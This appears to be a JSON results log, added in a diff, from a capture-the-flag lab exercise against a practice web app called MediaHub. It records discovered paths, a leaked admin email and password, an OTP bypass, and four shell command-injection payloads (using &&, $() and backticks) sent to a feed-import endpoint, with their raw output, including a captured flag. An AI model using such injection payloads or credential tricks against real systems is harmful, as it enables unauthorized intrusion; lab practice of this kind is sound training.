@@ -1,0 +1,52 @@
+{
+  "target": "http://10.114.136.231",
+  "discovered_paths": [
+    "/",
+    "index.php",
+    "login.php",
+    "dashboard.php",
+    "search.php",
+    "otp.php",
+    "verify_otp.php",
+    "api_login.php",
+    "import_feed_api.php"
+  ],
+  "backup_hits": [
+    "login.php.bak"
+  ],
+  "leaked_emails": [
+    "admin@mediahub.thm"
+  ],
+  "credential_used": {
+    "email": "admin@mediahub.thm",
+    "password": "MediaHub2026",
+    "otp_bypassed": true
+  },
+  "admin_flag": "THM{ADMIN_ACCESS_USING_BURP}",
+  "post_auth_findings": [
+    {
+      "endpoint": "import_feed_api.php",
+      "payload": "http://example.com",
+      "raw_response": "{\"ok\":false,\"error\":\"Internet not connected\",\"cmd_output\":\"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\\n                                 Dload  Upload   Total   Spent    Left  Speed\\n\\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0\\r  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0\\r  0     0    0     0    0     0      0      0 --:--:--  0:00:02 --:--:--     0\\r  0     0    0     0    0     0      0      0 --:--:--  0:00:03 --:--:--     0\\r  0     0    0     0    0     0      0      0 --:--:--  0:00:04 --:--:--     0\\ncurl: (28) Connection timed out after 4001 milliseconds\\n\"}",
+      "extracted_flag": null
+    },
+    {
+      "endpoint": "import_feed_api.php",
+      "payload": "http://x&&cat /var/www/user.txt",
+      "raw_response": "{\"ok\":true,\"message\":\"Feed fetched successfully\",\"cmd_output\":\"THM{SYSTEM_PWNED_SUCCESSFULLY}\\n\"}",
+      "extracted_flag": "THM{SYSTEM_PWNED_SUCCESSFULLY}"
+    },
+    {
+      "endpoint": "import_feed_api.php",
+      "payload": "http://x$(cat /var/www/user.txt)",
+      "raw_response": "{\"ok\":false,\"error\":\"Internet not connected\",\"cmd_output\":\"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\\n                                 Dload  Upload   Total   Spent    Left  Speed\\n\\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: xTHMSYSTEM_PWNED_SUCCESSFULLY\\n\"}",
+      "extracted_flag": null
+    },
+    {
+      "endpoint": "import_feed_api.php",
+      "payload": "http://x`cat /var/www/user.txt`",
+      "raw_response": "{\"ok\":false,\"error\":\"Internet not connected\",\"cmd_output\":\"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\\n                                 Dload  Upload   Total   Spent    Left  Speed\\n\\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: xTHMSYSTEM_PWNED_SUCCESSFULLY\\n\"}",
+      "extracted_flag": null
+    }
+  ]
+}
